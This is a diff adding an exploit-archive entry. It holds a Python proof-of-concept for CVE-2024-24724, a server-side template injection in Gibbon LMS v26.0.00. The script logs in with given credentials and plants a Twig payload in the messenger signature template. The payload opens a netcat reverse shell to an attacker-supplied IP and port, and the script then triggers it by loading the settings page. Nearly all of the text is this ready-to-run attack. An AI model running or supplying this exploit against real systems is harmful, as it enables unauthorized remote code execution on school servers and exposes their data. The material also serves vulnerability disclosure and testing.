@@ -1,0 +1,57 @@
+id: 39505
+date: 04/01/2024
+title: Gibbon 26.0.00 Server-Side Template Injection / Remote Code Execution Exploit
+author: Islam Rzayev
+cves: CVE-2024-24724
+
+# Exploit Title: Gibbon LMS has an SSTI vulnerability on the v26.0.00 version
+# Exploit Author: SecondX.io Research Team(Islam Rzayev,Fikrat Guliev, Ali Maharramli)
+# Vendor Homepage: https://gibbonedu.org/
+# Software Link: https://github.com/GibbonEdu/core
+# Version: v26.0.00
+# Tested on: Ubuntu 22.0
+# CVE : CVE-2024-24724
+import requests
+import re
+import sys
+
+
+def login(target_host, target_port,email,password):
+    url = f'http://{target_host}:{target_port}/login.php?timeout=true'
+    headers = {"Content-Type": "multipart/form-data; boundary=---------------------------174475955731268836341556039466"}
+    data = f"-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\"address\"\r\n\r\n\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\"method\"\r\n\r\ndefault\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{email}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{password}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\"gibbonSchoolYearID\"\r\n\r\n025\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: form-data; name=\"gibboni18nID\"\r\n\r\n0002\r\n-----------------------------174475955731268836341556039466--\r\n"
+    r = requests.post(url, headers=headers, data=data, allow_redirects=False)
+    Session_Cookie = re.split(r"\s+", r.headers['Set-Cookie'])
+    if Session_Cookie[4] is not None and '/index.php' in str(r.headers['Location']):
+        print("login successful!")
+
+    return Session_Cookie[4]
+
+
+
+def rce(cookie, target_host, target_port, attacker_ip, attacker_port):
+    url = f'http://{target_host}:{target_port}/modules/School%20Admin/messengerSettingsProcess.php'
+    headers = {"Content-Type": "multipart/form-data; boundary=---------------------------67142646631840027692410521651", "Cookie": cookie}
+    data = f"-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\"address\"\r\n\r\n/modules/School Admin/messengerSettings.php\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\"enableHomeScreenWidget\"\r\n\r\nY\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\"signatureTemplate\"\r\n\r\n{{{{[\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f']|filter('system')}}}}\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\"messageBcc\"\r\n\r\n\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\"pinnedMessagesOnHome\"\r\n\r\nN\r\n-----------------------------67142646631840027692410521651--\r\n"
+    r = requests.post(url, headers=headers, data=data, allow_redirects=False)
+    if 'success0' in str(r.headers['Location']):
+        print("Payload uploaded successfully!")
+
+
+
+def trigger(cookie, target_host, target_port):
+    url = f'http://{target_host}:{target_port}/index.php?q=/modules/School%20Admin/messengerSettings.php&return=success0'
+    headers = {"Cookie": cookie}
+    print("RCE successful!")
+    r = requests.get(url, headers=headers, allow_redirects=False)
+
+
+if __name__ == '__main__':
+    if len(sys.argv) != 7:
+        print("Usage: script.py <target_host> <target_port> <attacker_ip> <attacker_port> <email> <password>")
+        sys.exit(1)
+    cookie = login(sys.argv[1], sys.argv[2],sys.argv[5],sys.argv[6])
+    rce(cookie, sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
+    trigger(cookie, sys.argv[1], sys.argv[2])
+
+#  0day.today [2024-04-02]  #
